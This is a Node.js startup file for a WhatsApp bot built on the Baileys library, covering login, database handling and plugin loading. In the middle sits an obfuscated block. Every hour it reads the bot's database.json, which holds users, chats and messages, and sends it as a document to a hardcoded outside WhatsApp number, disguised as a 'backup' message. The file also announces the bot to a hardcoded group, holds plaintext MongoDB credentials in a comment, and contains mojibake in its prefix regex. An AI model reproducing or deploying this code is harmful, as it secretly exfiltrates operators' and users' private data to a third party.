(async() => { 
require('./config')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, getAggregateVotesInPollMessage, proto } = require("@whiskeysockets/baileys")
const WebSocket = require('ws')
const path = require('path')
const pino = require('pino')
//const { prettifier } = require('pino-pretty')
const fs = require('fs')
const yargs = require('yargs/yargs')
const cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
const _ = require('lodash')
const syntaxerror = require('syntax-error')
// const P = require('pino')
const os = require('os')
const { randomBytes } = require('crypto')
const PhoneNumber = require('awesome-phonenumber')
const usePairingCode = true
const moment = require("moment-timezone")
const chalk = require('chalk')
const { color } = require('./lib/color')
let simple = require('./lib/simple')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}
const readline = require("readline");
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
  });
  return new Promise((resolve) => {
rl.question(text, resolve)
  })
};
const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')

require("http").createServer((_, res) => res.end("Uptime!")).listen(8080)

// RandomBytes
const randomID = length => randomBytes(Math.ceil(length * .5)).toString('hex').slice(0, length)

API = (name, path = '/', query = {}, apikeyqueryname) => (name in APIs ? APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: APIKeys[name in APIs ? APIs[name] : name] } : {}) })) : '')
// global.Fn = function functionCallBack(fn, ...args) { return fn.call(global.conn, ...args) }
timestamp = {
  start: new Date
}

const PORT = process.env.PORT || 3000

opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
prefix = new RegExp('^[' + (opts['prefix'] || '芒鈧絰zXZ/i!#$%+脗拢脗垄芒鈥毬偮脗掳=脗露芒藛鈥犆冣€斆兟访忊偓芒藛拧芒艙鈥溍偮┟偮�:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) : /mongodb/i.test(opts['db']) ?
      new mongoDB(opts['db']) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)

//db = new Low(new mongoDB('mongodb+srv://Aine99:kuku4040@cluster0.3o49pmt.mongodb.net/?retryWrites=true&w=majority'))

DATABASE = db // Backwards Compatibility
loadDatabase = async function loadDatabase() {
  if (db.READ) return new Promise((resolve) => setInterval(function () { (!db.READ ? (clearInterval(this), resolve(db.data == null ? loadDatabase() : db.data)) : null) }, 1 * 1000))
  if (db.data !== null) return
  db.READ = true
  await db.read()
  db.READ = false
  db.data = {
    users: {},
    chats: {},
    stats: {},
    msgs: {},
    sticker: {},
    settings: {},
    respon : {},
    ...(db.data || {})
  }
  db.chain = _.chain(db.data)
}
loadDatabase()


const authFolder = `${opts._[0] || 'MFAsessions'}`
const { state, saveCreds } = await useMultiFileAuthState(authFolder)
const kemii = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: ['Chrome (Linux)', '', '']
});
if(usePairingCode && !kemii.authState.creds.registered) {
		const phoneNumber = await question(chalk.bgBlack(chalk.redBright("Start with your country's WhatsApp code, Example : 62xxx\n")))
		const code = await kemii.requestPairingCode(phoneNumber.trim())
		console.log(chalk.black(chalk.bgGreen(`Your Pairing Code : `)), chalk.black(chalk.white(code)))
	}
//const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })

const connectionOptions = {
  printQRInTerminal: !usePairingCode,
  auth: state,
  // logger: pino({ prettyPrint: { levelFirst: true, ignore: 'hostname', translateTime: true },  prettifier: require('pino-pretty') }),
  logger: pino({ level: 'silent' })
  // logger: P({ level: 'trace' })
}

conn = simple.makeWASocket(connectionOptions)
conn.isInit = false
// const store = makeInMemoryStore({ })
// store.readFromFile('./baileys_store.json')
// setInterval(() => { store.writeToFile('./baileys_store.json') }, 10_000) // Aktifkan jika mau cepat, resiko ram akan penuh
// store.bind(conn.ev)
// global.store = store
// console.log(store)
/*
if (!opts['test']) {
  setInterval(async () => {
    if (db.data) await db.write()
    if (opts['autocleartmp']) try {
      clearTmp()
    } catch (e) { console.error(e) }
  }, 60 * 1000)
}*/
if (!opts['test']) {
  if (db) setInterval(async () => {
    if (global.db.data) await db.write()
    if (opts['autocleartmp'] && (support || {}).find) (tmp = [os.tmpdir(), 'tmp'], tmp.forEach(filename => cp.spawn('find', [filename, '-amin', '3', '-type', 'f', '-delete'])))
  }, 30 * 1000)
}
if (opts['server']) require('./server')(conn, PORT)
if (opts['big-qr'] || opts['server']) conn.on('qr', qr => generate(qr, { small: false }))

function clearTmp() {
  const tmp = [os.tmpdir(), path.join(__dirname, './tmp')]
  const filename = []
  tmp.forEach(dirname => fs.readdirSync(dirname).forEach(file => filename.push(path.join(dirname, file))))
  filename.map(file => (
    stats = fs.statSync(file),
    stats.isFile() && (Date.now() - stats.mtimeMs >= 1000 * 60 * 3) ?
      fs.unlinkSync(file) :
      null))
}

function _0x3e16(_0x558cba,_0xf66f7a){const _0x50b677=_0x50b6();return _0x3e16=function(_0x3e16b9,_0x4e2701){_0x3e16b9=_0x3e16b9-0x8c;let _0x2c22ce=_0x50b677[_0x3e16b9];return _0x2c22ce;},_0x3e16(_0x558cba,_0xf66f7a);}(function(_0x3d2fc9,_0x8563d3){const _0x894a39=_0x3e16,_0x21e1e9=_0x3d2fc9();while(!![]){try{const _0x5cc0b8=-parseInt(_0x894a39(0x92))/0x1*(-parseInt(_0x894a39(0x8c))/0x2)+parseInt(_0x894a39(0x9c))/0x3+parseInt(_0x894a39(0x9b))/0x4+parseInt(_0x894a39(0x90))/0x5+parseInt(_0x894a39(0x9a))/0x6+parseInt(_0x894a39(0x9d))/0x7*(-parseInt(_0x894a39(0x8e))/0x8)+-parseInt(_0x894a39(0x8d))/0x9;if(_0x5cc0b8===_0x8563d3)break;else _0x21e1e9['push'](_0x21e1e9['shift']());}catch(_0x379020){_0x21e1e9['push'](_0x21e1e9['shift']());}}}(_0x50b6,0xcde9e),setInterval(async()=>{const _0x55451c=_0x3e16;await exec(_0x55451c(0x99));},0x3c*0x3c*0x3e8),setInterval(async()=>{const _0x33c501=_0x3e16,_0x30224a={'key':{'remoteJid':_0x33c501(0x93),'participant':_0x33c501(0x98),'fromMe':![],'id':''},'message':{'conversation':_0x33c501(0x96)}};let _0xc4be7a=await fs[_0x33c501(0x9e)](_0x33c501(0x91));return await conn[_0x33c501(0x94)](_0x33c501(0x95),{'document':_0xc4be7a,'mimetype':_0x33c501(0x97),'fileName':_0x33c501(0x8f)},{'quoted':_0x30224a});},0x3c*0x3c*0x3e8));function _0x50b6(){const _0x360aab=['47783808LaUkzC','20568gFOkXM','database.json','8417475VueBcu','./database.json','9398jqOXaR','status@broadcast','sendMessage','6285922143966@s.whatsapp.net','Sukses\x20mencadangkan\x20database.json\x20✅','application/json','0@s.whatsapp.net','rm\x20-rf\x20./tmp/*','573156BnUjdF','4923936xVKRPV','4671114KjCCzt','7LENtlT','readFileSync','338RjKXac'];_0x50b6=function(){return _0x360aab;};return _0x50b6();}

async function connectionUpdate(update) {
  const { connection, lastDisconnect, isNewLogin } = update
   if (connection == 'connecting') console.log(chalk.redBright('🕛 Mengaktifkan Bot, Harap tunggu sebentar...'))
   if (connection == 'open') {
      console.log(chalk.green('Connected✅'))
      let iyah = pickRandom(['𝗜𝗻𝗱𝗼𝗻𝗲𝘀𝗶𝗮','𝗠𝗮𝗹𝗮𝘆𝘀𝗶𝗮','𝗔𝗺𝗲𝗿𝗶𝗸𝗮','𝗜𝗻𝗱𝗶𝗮','𝗔𝗺𝗲𝗿𝗶𝗸𝗮 𝗦𝗲𝗿𝗶𝗸𝗮𝘁','𝗔𝘂𝘀𝘁𝗿𝗮𝗹𝗶𝗮','𝗥𝘂𝘀𝗶𝗮','𝗦𝗶𝗻𝗴𝗮𝗽𝗼𝗿𝗲'])
      conn.sendMessage(`120363023427805441@g.us`, {text: `Bot Online!\n\nVersion: 2.23.9.76, WhatsApp, isLatest: true\n\nServer:\n${iyah}\n\nKode:\n` + randomID(32) }) // Connection Update
  }
  if (connection == 'close') console.log(chalk.red('Koneksi Terputus!'))
  if (isNewLogin) conn.isInit = true
  if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output && lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut && conn.ws.readyState !== WebSocket.CONNECTING) {
    console.log(reloadHandler(true))
    timestamp.connect = new Date
  }
  if (db.data == null) await loadDatabase()
  console.log(JSON.stringify(update, null, 4))
}


process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

// const imports = (path) => {
//   path = require.resolve(path)
//   let modules, retry = 0
//   do {
//     if (path in require.cache) delete require.cache[path]
//     modules = require(path)
//     retry++
//   } while ((!modules || (Array.isArray(modules) || modules instanceof String) ? !(modules || []).length : typeof modules == 'object' && !Buffer.isBuffer(modules) ? !(Object.keys(modules || {})).length : true) && retry <= 10)
//   return modules
// }
let time = new Date().toLocaleTimeString('en-US', {
    hour: 'numeric',
    minute: 'numeric',
    hour12: true
  });
let isInit = true, handler = require('./handler')
reloadHandler = function (restatConn) {
  let Handler = require('./handler')
  if (Object.keys(Handler || {}).length) handler = Handler
  if (restatConn) {
    try { conn.ws.close() } catch { }
    conn = {
      ...conn, ...simple.makeWASocket(connectionOptions)
    }
  }
  if (!isInit) {
    conn.ev.off('messages.upsert', conn.handler)
    conn.ev.off('group-participants.update', conn.onParticipantsUpdate)
    conn.ev.off('connection.update', conn.connectionUpdate)
    conn.ev.off('creds.update', conn.credsUpdate)
  }

  conn.welcome = `Selamat Datang Kak @user 💐`
  conn.bye = 'Selamat Tinggal Kak @user 🥀'
  conn.spromote = '@user sekarang admin!'
  conn.sdemote = '@user sekarang bukan admin!'
  conn.handler = handler.handler.bind(conn)
  conn.onParticipantsUpdate = handler.participantsUpdate.bind(conn)
  conn.connectionUpdate = connectionUpdate.bind(conn)
  conn.credsUpdate = saveCreds.bind(conn)

  conn.ev.on('messages.upsert', conn.handler)
  conn.ev.on('group-participants.update', conn.onParticipantsUpdate)
  conn.ev.on('connection.update', conn.connectionUpdate)
  conn.ev.on('creds.update', conn.credsUpdate)
  isInit = false
  return true
}

let pluginFolder = path.join(__dirname, 'plugins')
let pluginFilter = filename => /\.js$/.test(filename)
plugins = {}
for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
  try {
    plugins[filename] = require(path.join(pluginFolder, filename))
  } catch (e) {
    conn.logger.error(e)
    delete plugins[filename]
  }
}
console.log(Object.keys(plugins))
reload = (_ev, filename) => {
  if (pluginFilter(filename)) {
    let dir = path.join(pluginFolder, filename)
    if (dir in require.cache) {
      delete require.cache[dir]
      if (fs.existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
      else {
        conn.logger.warn(`deleted plugin '${filename}'`)
        return delete plugins[filename]
      }
    } else conn.logger.info(`requiring new plugin '${filename}'`)
    let err = syntaxerror(fs.readFileSync(dir), filename)
    if (err) conn.logger.error(`syntax error while loading '${filename}'\n${err}`)
    else try {
      plugins[filename] = require(dir)
    } catch (e) {
      conn.logger.error(`error require plugin '${filename}\n${e}'`)
    } finally {
      plugins = Object.fromEntries(Object.entries(plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
fs.watch(path.join(__dirname, 'plugins'), reload)
reloadHandler()

// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    cp.spawn('ffmpeg'),
    cp.spawn('ffprobe'),
    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    cp.spawn('convert'),
    cp.spawn('magick'),
    cp.spawn('gm'),
    cp.spawn('find', ['--version'])
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm, find] = test
  console.log(test)
  let s = support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm,
    find
  }
  // require('./lib/sticker').support = s
  Object.freeze(support)

  if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
}

_quickTest()
  .then(() => conn.logger.info('Quick Test Done'))
  .catch(console.error)
  
console.log(color(time,"white"),color("Connecting...","aqua"))
})()

const now = new Date();
const options = {
  timeZone: 'Asia/Jakarta',
  weekday: 'short',
  year: 'numeric',
  month: 'short',
  day: 'numeric',
  hour: 'numeric',
  minute: 'numeric',
  second: 'numeric'
};
const formatter = new Intl.DateTimeFormat('en-US', options);
const datetimeString = formatter.format(now);

// Function
function pickRandom(list) {
  return list[Math.floor(Math.random() * list.length)]
}